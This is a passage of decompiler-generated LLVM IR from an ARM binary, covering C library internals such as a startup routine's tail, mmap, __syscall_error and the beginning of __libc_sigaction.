  %v0_150a4 = load i32, i32* @r4, align 4
  store i32 %v0_150a4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_150ac = call i32 @__check_one_fd(i32 2, i32 %v0_150a4)
  store i32 %v2_150ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_150b0

dec_label_pc_150b0:                               ; preds = %dec_label_pc_15078, %dec_label_pc_15060, %dec_label_pc_15088
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 260, i32* %r3.global-to-local, align 4
  %v2_150b8 = load i32, i32* %arg3, align 4
  store i32 %v2_150b8, i32* %r2.global-to-local, align 4
  %v2_150bc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_150bc, i32* %r1.global-to-local, align 4
  %v3_150c0 = add i32 %v2_150bc, 260
  %v4_150c0 = inttoptr i32 %v3_150c0 to i32*
  store i32 %v2_150b8, i32* %v4_150c0, align 4
  %v0_150c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_150c4 = inttoptr i32 %v0_150c4 to i32*
  %v2_150c4 = load i32, i32* %v1_150c4, align 4
  store i32 %v2_150c4, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_150c8 = icmp eq i32 %v2_150c4, 0
  store i1 %v2_150c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_150c8, label %bb84, label %dec_label_pc_150d0

dec_label_pc_150d0:                               ; preds = %dec_label_pc_150b0
  store i32 164, i32* %r3.global-to-local, align 4
  %v0_150d4 = load i32, i32* %r1.global-to-local, align 4
  %v2_150d4 = add i32 %v0_150d4, 164
  %v3_150d4 = inttoptr i32 %v2_150d4 to i32*
  %v4_150d4 = load i32, i32* %v3_150d4, align 4
  store i32 %v4_150d4, i32* %r3.global-to-local, align 4
  %v2_150d8 = inttoptr i32 %v4_150d4 to i32*
  store i32 %v2_150c4, i32* %v2_150d8, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_150e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_150e0 = inttoptr i32 %v0_150e0 to i32*
  %v2_150e0 = load i32, i32* %v1_150e0, align 4
  store i32 %v2_150e0, i32* %r0.global-to-local, align 4
  %v4_150e4 = call i32 @__GI_strrchr(i32 %v2_150e0, i32 47, i32 %v2_150b8, i32 %v4_150d4)
  store i32 %v4_150e4, i32* %r0.global-to-local, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_150ec = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_150ec, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_150f0 = icmp eq i32 %v4_150e4, 0
  store i1 %v2_150f0, i1* %cpsr_z.global-to-local, align 1
  %v2_150f4 = add i32 %v2_150ec, 96
  %v3_150f4 = inttoptr i32 %v2_150f4 to i32*
  %v4_150f4 = load i32, i32* %v3_150f4, align 4
  store i32 %v4_150f4, i32* %r2.global-to-local, align 4
  br i1 %v2_150f0, label %.thread57, label %bb83

.thread57:                                        ; preds = %dec_label_pc_150d0
  %v2_150fc58 = inttoptr i32 %v4_150f4 to i32*
  store i32 0, i32* %v2_150fc58, align 4
  br label %bb84

bb83:                                             ; preds = %dec_label_pc_150d0
  %v2_150f8 = add i32 %v4_150e4, 1
  store i32 %v2_150f8, i32* %r3.global-to-local, align 4
  %v2_150fc = inttoptr i32 %v4_150f4 to i32*
  store i32 %v4_150e4, i32* %v2_150fc, align 4
  %v1_15100 = load i32, i32* %r3.global-to-local, align 4
  %v2_15100 = load i32, i32* %r2.global-to-local, align 4
  %v3_15100 = inttoptr i32 %v2_15100 to i32*
  store i32 %v1_15100, i32* %v3_15100, align 4
  br label %bb84

bb84:                                             ; preds = %.thread57, %bb83, %dec_label_pc_150b0
  %v2_15110 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15110, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_1511c = add i32 %v2_15110, -12
  store i32 %v2_1511c, i32* %r5.global-to-local, align 4
  store i32 2004, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_1512c = add i32 %v2_15110, 2004
  %v4_1512c = inttoptr i32 %v3_1512c to i32*
  store i32 %arg5, i32* %v4_1512c, align 4
  %v0_1514418 = load i32, i32* %r4.global-to-local, align 4
  %v1_1514419 = load i32, i32* %r7.global-to-local, align 4
  %v3_1514421 = icmp uge i32 %v0_1514418, %v1_1514419
  store i1 %v3_1514421, i1* %cpsr_c.global-to-local, align 1
  %v9_1514427 = icmp eq i32 %v0_1514418, %v1_1514419
  store i1 %v9_1514427, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1514421, label %dec_label_pc_15178.lr.ph, label %dec_label_pc_15134

dec_label_pc_15134:                               ; preds = %bb84, %dec_label_pc_15134
  %v1_15134 = phi i32 [ %v1_15140, %dec_label_pc_15134 ], [ %v0_1514418, %bb84 ]
  %v0_15134 = load i32, i32* %r5.global-to-local, align 4
  %v2_15134 = and i32 %v1_15134, 1073741824
  %v3_15134 = icmp ne i32 %v2_15134, 0
  store i1 %v3_15134, i1* %cpsr_c.global-to-local, align 1
  %v4_15134 = mul i32 %v1_15134, 4
  %v5_15134 = add i32 %v4_15134, %v0_15134
  %v6_15134 = inttoptr i32 %v5_15134 to i32*
  %v7_15134 = load i32, i32* %v6_15134, align 4
  store i32 %v7_15134, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_15134)
  %v0_15140 = load i32, i32* %r4.global-to-local, align 4
  %v1_15140 = add i32 %v0_15140, 1
  store i32 %v1_15140, i32* %r4.global-to-local, align 4
  %v1_15144 = load i32, i32* %r7.global-to-local, align 4
  %v3_15144 = icmp uge i32 %v1_15140, %v1_15144
  store i1 %v3_15144, i1* %cpsr_c.global-to-local, align 1
  %v9_15144 = icmp eq i32 %v1_15140, %v1_15144
  store i1 %v9_15144, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15144, label %dec_label_pc_15178.lr.ph, label %dec_label_pc_15134

dec_label_pc_15178.lr.ph:                         ; preds = %dec_label_pc_15134, %bb84
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1514c = icmp eq i32 %v0_14f98, 0
  store i1 %v2_1514c, i1* %cpsr_z.global-to-local, align 1
  %v2_15154 = xor i1 %v2_1514c, true
  call void @__pseudo_cond_branch(i1 %v2_15154, i32 %v0_14f98)
  store i32 -12, i32* %r2.global-to-local, align 4
  %v2_15160 = load i32, i32* %stack_var_-416, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v2_1516c = add i32 %v2_15160, -12
  store i32 %v2_1516c, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15178

dec_label_pc_15178:                               ; preds = %dec_label_pc_15178.dec_label_pc_15178_crit_edge, %dec_label_pc_15178.lr.ph
  %v1_15178 = phi i32 [ %v1_15184, %dec_label_pc_15178.dec_label_pc_15178_crit_edge ], [ 0, %dec_label_pc_15178.lr.ph ]
  %v0_15178 = phi i32 [ %v0_15178.pre, %dec_label_pc_15178.dec_label_pc_15178_crit_edge ], [ %v2_1516c, %dec_label_pc_15178.lr.ph ]
  %v2_15178 = and i32 %v1_15178, 1073741824
  %v3_15178 = icmp ne i32 %v2_15178, 0
  store i1 %v3_15178, i1* %cpsr_c.global-to-local, align 1
  %v4_15178 = mul i32 %v1_15178, 4
  %v5_15178 = add i32 %v4_15178, %v0_15178
  %v6_15178 = inttoptr i32 %v5_15178 to i32*
  %v7_15178 = load i32, i32* %v6_15178, align 4
  store i32 %v7_15178, i32* %ip.global-to-local, align 4
  store i32 86404, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_15178)
  %v0_15184 = load i32, i32* @r4, align 4
  %v1_15184 = add i32 %v0_15184, 1
  store i32 %v1_15184, i32* @r4, align 4
  %v1_15188 = load i32, i32* @r7, align 4
  %v3_15188 = icmp uge i32 %v1_15184, %v1_15188
  store i1 %v3_15188, i1* %cpsr_c.global-to-local, align 1
  %v9_15188 = icmp eq i32 %v1_15184, %v1_15188
  store i1 %v9_15188, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15188, label %dec_label_pc_15190, label %dec_label_pc_15178.dec_label_pc_15178_crit_edge

dec_label_pc_15178.dec_label_pc_15178_crit_edge:  ; preds = %dec_label_pc_15178
  %v0_15178.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15178

dec_label_pc_15190:                               ; preds = %dec_label_pc_15178
  %v2_15194.pre = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15194.pre, i32* %r0.global-to-local, align 4
  %v2_15198 = add i32 %v2_15194.pre, -67200
  store i32 %v2_15198, i32* %r2.global-to-local, align 4
  store i32 %v2_15198, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_151a0 = icmp eq i32 %v2_15198, 0
  store i1 %v2_151a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_151a0, label %dec_label_pc_151b8, label %dec_label_pc_151a8

dec_label_pc_151a8:                               ; preds = %dec_label_pc_15190
  store i32 86448, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_15198)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_151b4 = load i32, i32* %r0.global-to-local, align 4
  %v2_151b4 = inttoptr i32 %v1_151b4 to i32*
  store i32 0, i32* %v2_151b4, align 4
  %v2_151bc.pre = load i32, i32* %stack_var_-416, align 4
  br label %dec_label_pc_151b8

dec_label_pc_151b8:                               ; preds = %dec_label_pc_15190, %dec_label_pc_151a8
  %v2_151bc = phi i32 [ %v2_15194.pre, %dec_label_pc_15190 ], [ %v2_151bc.pre, %dec_label_pc_151a8 ]
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 %v2_151bc, i32* %r1.global-to-local, align 4
  %v2_151c0 = add i32 %v2_151bc, 128
  %v3_151c0 = inttoptr i32 %v2_151c0 to i32*
  %v4_151c0 = load i32, i32* %v3_151c0, align 4
  store i32 %v4_151c0, i32* %r2.global-to-local, align 4
  store i32 %v4_151c0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_151c8 = icmp eq i32 %v4_151c0, 0
  store i1 %v2_151c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_151c8, label %dec_label_pc_151e0, label %dec_label_pc_151d0

dec_label_pc_151d0:                               ; preds = %dec_label_pc_151b8
  store i32 86488, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_151c0)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_151dc = load i32, i32* %r0.global-to-local, align 4
  %v2_151dc = inttoptr i32 %v1_151dc to i32*
  store i32 0, i32* %v2_151dc, align 4
  br label %dec_label_pc_151e0

dec_label_pc_151e0:                               ; preds = %dec_label_pc_151b8, %dec_label_pc_151d0
  %v2_151e0 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v2_151e0, i32* @r0, align 4
  %v1_151e4 = call i32 @_setjmp(i32 %v2_151e0)
  store i32 %v1_151e4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_151e8 = icmp eq i32 %v1_151e4, 0
  store i1 %v2_151e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_151e8, label %dec_label_pc_151f0, label %dec_label_pc_1523c

dec_label_pc_151f0:                               ; preds = %dec_label_pc_151e0
  %v0_151f0 = call i32 @__aeabi_read_tp()
  store i32 %v0_151f0, i32* %r0.global-to-local, align 4
  %v1_151f4 = add i32 %v0_151f0, -1168
  store i32 %v1_151f4, i32* %r2.global-to-local, align 4
  %v2_151fc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_151fc, i32* %r4.global-to-local, align 4
  store i32 56, i32* %r3.global-to-local, align 4
  %v2_15208 = add i32 %v2_151fc, 56
  %v3_15208 = inttoptr i32 %v2_15208 to i32*
  %v4_15208 = load i32, i32* %v3_15208, align 4
  store i32 %v4_15208, i32* %ip.global-to-local, align 4
  store i32 %v2_151e0, i32* %r3.global-to-local, align 4
  %v2_15218 = add i32 %v0_151f0, -1040
  %v3_15218 = inttoptr i32 %v2_15218 to i32*
  store i32 %v2_151e0, i32* %v3_15218, align 4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_15224 = load i32, i32* %ip.global-to-local, align 4
  %v1_15224 = inttoptr i32 %v0_15224 to i32*
  %v2_15224 = load i32, i32* %v1_15224, align 4
  store i32 %v2_15224, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v0_15234 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_152d8

dec_label_pc_1523c:                               ; preds = %dec_label_pc_151e0
  store i32 40, i32* %r3.global-to-local, align 4
  %v2_15240 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15240, i32* %ip.global-to-local, align 4
  %v2_15244 = add i32 %v2_15240, 40
  %v3_15244 = inttoptr i32 %v2_15244 to i32*
  %v4_15244 = load i32, i32* %v3_15244, align 4
  store i32 %v4_15244, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15244)
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_15254 = load i32, i32* %stack_var_-416, align 4
  %v2_15258 = add i32 %v2_15254, 120
  %v3_15258 = inttoptr i32 %v2_15258 to i32*
  %v4_15258 = load i32, i32* %v3_15258, align 4
  store i32 %v4_15258, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1525c

dec_label_pc_1525c:                               ; preds = %dec_label_pc_15290.dec_label_pc_1525c_crit_edge, %dec_label_pc_1523c
  %v0_1525c = phi i32 [ %v0_1525c.pre, %dec_label_pc_15290.dec_label_pc_1525c_crit_edge ], [ %v4_15258, %dec_label_pc_1523c ]
  %v1_1525c = inttoptr i32 %v0_1525c to i32*
  %v2_1525c = load i32, i32* %v1_1525c, align 4
  store i32 %v0_1525c, i32* %r2.global-to-local, align 4
  store i32 %v2_1525c, i32* %r4.global-to-local, align 4
  %v1_15268 = add i32 %v2_1525c, -1
  store i32 %v1_15268, i32* %r1.global-to-local, align 4
  %v2_1526c89 = load i32, i32* %v1_1525c, align 4
  store i32 %v2_1526c89, i32* %r3.global-to-local, align 4
  %v3_1527091 = icmp uge i32 %v2_1526c89, %v2_1525c
  store i1 %v3_1527091, i1* %cpsr_c.global-to-local, align 1
  %v9_1527097 = icmp eq i32 %v2_1526c89, %v2_1525c
  store i1 %v9_1527097, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1527097, label %dec_label_pc_15278, label %dec_label_pc_15290

dec_label_pc_15278:                               ; preds = %dec_label_pc_1525c, %dec_label_pc_15278.dec_label_pc_1526c_crit_edge
  %v0_1527898 = phi i32 [ %v1_15270.pre, %dec_label_pc_15278.dec_label_pc_1526c_crit_edge ], [ %v2_1525c, %dec_label_pc_1525c ]
  store i32 %v0_1527898, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15288 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15288, label %dec_label_pc_1528c, label %dec_label_pc_15278.dec_label_pc_1526c_crit_edge

dec_label_pc_15278.dec_label_pc_1526c_crit_edge:  ; preds = %dec_label_pc_15278
  %v0_1526c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15270.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1526c = inttoptr i32 %v0_1526c.pre to i32*
  %v2_1526c = load i32, i32* %v1_1526c, align 4
  store i32 %v2_1526c, i32* %r3.global-to-local, align 4
  %v3_15270 = icmp uge i32 %v2_1526c, %v1_15270.pre
  store i1 %v3_15270, i1* %cpsr_c.global-to-local, align 1
  %v9_15270 = icmp eq i32 %v2_1526c, %v1_15270.pre
  store i1 %v9_15270, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15270, label %dec_label_pc_15278, label %dec_label_pc_15290

dec_label_pc_1528c:                               ; preds = %dec_label_pc_15278
  %v0_1528c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1528c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15290

dec_label_pc_15290:                               ; preds = %dec_label_pc_1525c, %dec_label_pc_15278.dec_label_pc_1526c_crit_edge, %dec_label_pc_1528c
  %v0_15298 = phi i32 [ %v0_1528c, %dec_label_pc_1528c ], [ %v2_1526c89, %dec_label_pc_1525c ], [ %v2_1526c, %dec_label_pc_15278.dec_label_pc_1526c_crit_edge ]
  %v1_15290 = phi i32 [ %v0_1528c, %dec_label_pc_1528c ], [ %v2_1525c, %dec_label_pc_1525c ], [ %v1_15270.pre, %dec_label_pc_15278.dec_label_pc_1526c_crit_edge ]
  %v3_15290 = icmp uge i32 %v0_15298, %v1_15290
  store i1 %v3_15290, i1* %cpsr_c.global-to-local, align 1
  %v9_15290 = icmp eq i32 %v0_15298, %v1_15290
  store i1 %v9_15290, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15290, label %dec_label_pc_15298, label %dec_label_pc_15290.dec_label_pc_1525c_crit_edge

dec_label_pc_15290.dec_label_pc_1525c_crit_edge:  ; preds = %dec_label_pc_15290
  %v0_1525c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1525c

dec_label_pc_15298:                               ; preds = %dec_label_pc_15290
  %v2_15298 = icmp ne i32 %v1_15290, 0
  store i1 %v2_15298, i1* %cpsr_c.global-to-local, align 1
  %v7_15298 = icmp eq i32 %v1_15290, 1
  store i1 %v7_15298, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15298, label %dec_label_pc_152d8, label %dec_label_pc_152a0

dec_label_pc_152a0:                               ; preds = %dec_label_pc_15298
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_152d8

dec_label_pc_152d8:                               ; preds = %dec_label_pc_15298, %dec_label_pc_152a0, %dec_label_pc_151f0
  %storemerge2 = phi i32 [ %v0_15234, %dec_label_pc_151f0 ], [ 0, %dec_label_pc_152a0 ], [ 0, %dec_label_pc_15298 ]
  store i32 %storemerge2, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r0.global-to-local, align 4
  %v1_152dc = call i32 @__GI_exit(i32 %storemerge2)
  store i32 %v1_152dc, i32* %r0.global-to-local, align 4
  %v0_152e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_152e0, label %bb85, label %.thread9

bb85:                                             ; preds = %dec_label_pc_152d8
  %v2_152e0 = load i32, i32* %r4.global-to-local, align 4
  %v2_152e4 = load i32, i32* @r8, align 4
  %v8_152e4 = shl i32 %v2_152e4, %v1_152dc
  %v9_152e4 = and i32 %v8_152e4, %v1_152dc
  %v8_152e8 = lshr i32 %v2_152e4, %v9_152e4
  %v9_152e8 = and i32 %v8_152e8, %v9_152e4
  %v2_152ec = inttoptr i32 %v9_152e8 to i64*
  %v3_152ec = load i64, i64* %v2_152ec, align 4
  %v5_152ec = trunc i64 %v3_152ec to i32
  %v6_152ec = udiv i64 %v3_152ec, 4294967296
  %v7_152ec = trunc i64 %v6_152ec to i32
  store i32 %v5_152ec, i32* %r1.global-to-local, align 4
  %v9_152ec = sub i32 %v7_152ec, %v2_152e4
  %v3_152f0 = mul i32 %v9_152ec, %v2_152e0
  %v5_152f8 = mul i32 %v2_152e0, 4
  %v5_152fc = udiv i32 %v2_152e0, 2
  %v6_152f8 = and i32 %v5_152fc, %v5_152f8
  %v6_152fc = and i32 %v6_152f8, %v3_152f0
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v6_152fc, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_152d8, %bb85
  %v5_15300 = phi i32 [ %v1_152dc, %dec_label_pc_152d8 ], [ %v6_152fc, %bb85 ]
  ret i32 %v5_15300

; uselistorder directives
  uselistorder i32 %v2_152e0, { 1, 0, 2 }
  uselistorder i32 %v1_152dc, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_15290, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1528c, { 1, 0, 2 }
  uselistorder i32 %v1_15270.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1525c, { 1, 0 }
  uselistorder i32 %v2_151bc, { 1, 0 }
  uselistorder i32 %v2_15194.pre, { 2, 0, 1 }
  uselistorder i32 %v1_15188, { 1, 0 }
  uselistorder i32 %v1_15184, { 3, 2, 1, 0 }
  uselistorder i32 %v1_15178, { 1, 0 }
  uselistorder i32 %v1_15144, { 1, 0 }
  uselistorder i32 %v1_15140, { 1, 2, 3, 0 }
  uselistorder i32 %v1_15134, { 1, 0 }
  uselistorder i32 %v2_15110, { 1, 0, 2 }
  uselistorder i32 %v4_150f4, { 1, 0, 2 }
  uselistorder i32 %v4_150e4, { 1, 0, 2, 3 }
  uselistorder i1 %v8_1502c, { 1, 2, 0 }
  uselistorder i32 %v2_14ff8, { 1, 2, 0 }
  uselistorder i32 %v1_14ff4, { 1, 2, 0 }
  uselistorder i1 %v2_14fe0, { 1, 0, 2 }
  uselistorder i32 %v5_14fe4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_14fb0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14f98, { 1, 0, 2 }
  uselistorder i32 %v2_14f8c, { 1, 0, 2 }
  uselistorder i32 %v3_14f5c, { 1, 0 }
  uselistorder i32* %stack_var_-416, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %tmp65, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %tmp64, { 2, 1, 0 }
  uselistorder i32 %tmp63, { 2, 1, 0 }
  uselistorder i32 %tmp62, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 1, 0, 2, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 4, 6, 5, 3, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 2, 26, 27, 28, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0 }
  uselistorder i32* %r1.global-to-local, { 4, 1, 5, 6, 7, 8, 9, 10, 12, 11, 14, 15, 16, 13, 2, 3, 17, 18, 19, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 12, 9, 10, 11, 17, 13, 14, 15, 16, 19, 18, 20, 21, 22, 25, 23, 24, 27, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10 }
  uselistorder i1* %cpsr_z.global-to-local, { 8, 4, 5, 6, 7, 0, 9, 10, 11, 12, 1, 13, 14, 2, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 3, 26 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 7, 9, 8, 3, 10, 11, 12, 14, 13, 2, 15, 17, 16, 0, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 27, 28, 1, 30 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 6, 8, 7, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 536870912, { 1, 0 }
  uselistorder i32 120, { 0, 2, 1, 5, 4, 3 }
  uselistorder i32 2008, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_152d8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15290, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15278, { 1, 0 }
  uselistorder label %dec_label_pc_151e0, { 1, 0 }
  uselistorder label %dec_label_pc_151b8, { 1, 0 }
  uselistorder label %dec_label_pc_15134, { 1, 0 }
  uselistorder label %bb84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_150b0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15088, { 3, 0, 1, 2 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_14ff8, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_14fe0, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb75, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1532c = load i32, i32* @r4, align 4
  store i32 %v3_1532c, i32* %stack_var_-16, align 4
  %v3_15338 = urem i32 %arg3, 4096
  %v2_1533c = icmp eq i32 %v3_15338, 0
  br i1 %v2_1533c, label %dec_label_pc_15360, label %dec_label_pc_15344

dec_label_pc_15344:                               ; preds = %entry
  %v0_15348 = call i32 @__aeabi_read_tp()
  store i32 %v0_15348, i32* %r0.global-to-local, align 4
  %v3_1534c = load i16, i16* @global_var_2222c.358, align 2
  %v4_1534c = sext i16 %v3_1534c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_15358 = add i32 %v4_1534c, %v0_15348
  %v4_15358 = inttoptr i32 %v3_15358 to i32*
  store i32 22, i32* %v4_15358, align 4
  %v0_15394.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15394

dec_label_pc_15360:                               ; preds = %entry
  %v0_15370 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15370, -4095
  br i1 %tmp, label %dec_label_pc_15390, label %dec_label_pc_15378

dec_label_pc_15378:                               ; preds = %dec_label_pc_15360
  %v1_1537c = sub i32 0, %v0_15370
  %v3_15380 = load i16, i16* @global_var_2222c.358, align 2
  %v4_15380 = sext i16 %v3_15380 to i32
  %v0_15384 = call i32 @__aeabi_read_tp()
  %v3_15388 = add i32 %v4_15380, %v0_15384
  %v4_15388 = inttoptr i32 %v3_15388 to i32*
  store i32 %v1_1537c, i32* %v4_15388, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15390

dec_label_pc_15390:                               ; preds = %dec_label_pc_15360, %dec_label_pc_15378
  %v0_15390 = phi i32 [ %v0_15370, %dec_label_pc_15360 ], [ -1, %dec_label_pc_15378 ]
  store i32 %v0_15390, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15394

dec_label_pc_15394:                               ; preds = %dec_label_pc_15344, %dec_label_pc_15390
  %v0_15394 = phi i32 [ %v0_15394.pre, %dec_label_pc_15344 ], [ %v0_15390, %dec_label_pc_15390 ]
  store i32 %v0_15394, i32* %r0.global-to-local, align 4
  %v2_15398 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15398, i32* @r4, align 4
  ret i32 %v0_15394

; uselistorder directives
  uselistorder i32 %v0_15394, { 1, 0 }
  uselistorder i32 %v0_15370, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_15394, { 1, 0 }
  uselistorder label %dec_label_pc_15390, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_153a8 = load i32, i32* @lr, align 4
  store i32 %v0_153a8, i32* %stack_var_-4, align 4
  %v0_153b0 = load i32, i32* @r0, align 4
  %v3_153b4 = load i16, i16* @global_var_2222c.358, align 2
  %v4_153b4 = sext i16 %v3_153b4 to i32
  store i32 %v4_153b4, i32* @r2, align 4
  %v0_153b8 = call i32 @__aeabi_read_tp()
  %v1_153bc = sub i32 0, %v0_153b0
  store i32 %v1_153bc, i32* @r3, align 4
  %v2_153c0 = load i32, i32* @r2, align 4
  %v3_153c0 = add i32 %v2_153c0, %v0_153b8
  %v4_153c0 = inttoptr i32 %v3_153c0 to i32*
  store i32 %v1_153bc, i32* %v4_153c0, align 4
  %v2_153c8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_153c8, i32* @lr, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_153d4 = load i32, i32* @r4, align 4
  %v6_153d4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_153dc = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_153dc, label %dec_label_pc_15430, label %dec_label_pc_153f4

